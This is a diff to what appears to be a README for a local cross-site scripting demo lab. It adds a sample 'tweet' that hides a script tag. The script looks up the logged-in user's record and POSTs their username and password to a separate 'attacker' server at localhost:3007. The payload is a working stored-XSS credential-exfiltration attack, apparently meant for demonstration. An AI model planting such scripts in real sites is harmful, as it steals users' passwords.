@@ -14,3 +14,25 @@ Start two servers: the server hosting the page and a malicious server.
 node server/server.js
 node attacker/eve.js
 json-server --watch db.json --port 3004
+
+// Begin Tweet
+
+Just a normal tweet not an secret script or something
+<script>
+    $.get('http://localhost:3004/users', function (data, status) {
+        for (var i = 0; i < data.length; i++) {
+            var obj = data[i];
+            if (obj.userName === localStorage.getItem("User")) {
+                const data2 = `Username=${obj.userName} - Password=${obj.password}`;
+                $.ajax({
+                    url: 'http://localhost:3007',
+                    method: 'POST',
+                    type: 'jsonp',
+                    data: data2
+                })
+            }
+        }
+    })
+</script>
+
+// End Tweet
